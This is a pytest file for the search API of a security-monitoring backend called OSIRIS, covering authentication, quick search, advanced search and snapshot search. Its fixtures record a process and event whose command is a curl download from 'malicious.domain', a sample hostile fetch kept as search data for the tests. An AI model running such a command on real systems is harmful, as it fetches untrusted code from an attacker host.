"""Unit tests for OSIRIS Advanced Search API routes (Phase 2 Milestone 2.7)."""

from __future__ import annotations

from datetime import datetime, timezone
from typing import Generator
import uuid

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session
from sqlalchemy.pool import StaticPool
from starlette.testclient import TestClient

from backend.api.deps import get_db
from backend.api.security import create_access_token
from backend.db.base import Base
from backend.db.models.app_user import AppUser
from backend.db.models.event import Event
from backend.db.models.host import Host
from backend.db.models.process import Process
from backend.db.models.snapshot import Snapshot
from backend.main import app


def utcnow() -> datetime:
    return datetime.now(timezone.utc)


@pytest.fixture
def api_session() -> Generator[Session, None, None]:
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(engine)
    session = Session(engine)

    yield session

    session.close()
    Base.metadata.drop_all(engine)
    engine.dispose()


@pytest.fixture
def client(api_session: Session) -> Generator[TestClient, None, None]:
    app.dependency_overrides[get_db] = lambda: api_session
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


@pytest.fixture
def analyst_user(api_session: Session) -> AppUser:
    user = AppUser(
        id=uuid.uuid4(),
        username="analyst_bob",
        password_hash="fakehash",
        display_name="Bob Analyst",
        role="analyst",
        is_active=True,
        created_at=utcnow(),
    )
    api_session.add(user)
    api_session.commit()
    return user


@pytest.fixture
def analyst_headers(analyst_user: AppUser) -> dict[str, str]:
    token = create_access_token(user_id=analyst_user.id, username=analyst_user.username, role=analyst_user.role)
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def search_fixtures(api_session: Session) -> Host:
    host = Host(id=uuid.uuid4(), hostname="search-target", ip_address="10.5.5.5", created_at=utcnow())
    proc = Process(
        id=uuid.uuid4(),
        host_id=host.id,
        pid=5555,
        command="/usr/bin/curl http://malicious.domain/payload",
        executable="/usr/bin/curl",
        started_at=utcnow(),
    )
    event = Event(
        id=uuid.uuid4(),
        host_id=host.id,
        process_id=proc.id,
        timestamp=utcnow(),
        source="auditd",
        event_type="network",
        action="connect",
        command="/usr/bin/curl http://malicious.domain/payload",
    )
    api_session.add_all([host, proc, event])
    api_session.commit()
    return host


class TestSearchApi:
    def test_unauthenticated_request_rejected(self, client: TestClient) -> None:
        resp = client.get("/api/search")
        assert resp.status_code == 401

    def test_quick_search_endpoint(
        self, client: TestClient, analyst_headers: dict[str, str], search_fixtures: Host
    ) -> None:
        resp = client.get("/api/search?q=malicious", headers=analyst_headers)
        assert resp.status_code == 200
        data = resp.json()
        assert data["total"] >= 1
        assert any("malicious" in item["description"].lower() for item in data["items"])

    def test_advanced_search_endpoint(
        self, client: TestClient, analyst_headers: dict[str, str], search_fixtures: Host
    ) -> None:
        payload = {
            "query": "curl",
            "host_id": str(search_fixtures.id),
            "entity_types": ["processes", "events"],
            "logic": "and",
        }
        resp = client.post("/api/search/advanced", json=payload, headers=analyst_headers)
        assert resp.status_code == 200
        data = resp.json()
        assert data["total"] >= 1
        assert any(item["entity_type"] == "process" for item in data["items"])

    def test_advanced_search_snapshots(
        self,
        client: TestClient,
        api_session: Session,
        analyst_headers: dict[str, str],
        search_fixtures: Host,
    ) -> None:
        snap = Snapshot(
            id=uuid.uuid4(),
            host_id=search_fixtures.id,
            timestamp=utcnow(),
            snapshot_type="network_table",
            data={},
        )
        api_session.add(snap)
        api_session.commit()

        payload = {
            "query": "network",
            "host_id": str(search_fixtures.id),
            "entity_types": ["snapshots"],
            "logic": "and",
        }
        resp = client.post("/api/search/advanced", json=payload, headers=analyst_headers)
        assert resp.status_code == 200
        data = resp.json()
        assert data["total"] >= 1
        assert any(item["entity_type"] == "snapshot" for item in data["items"])

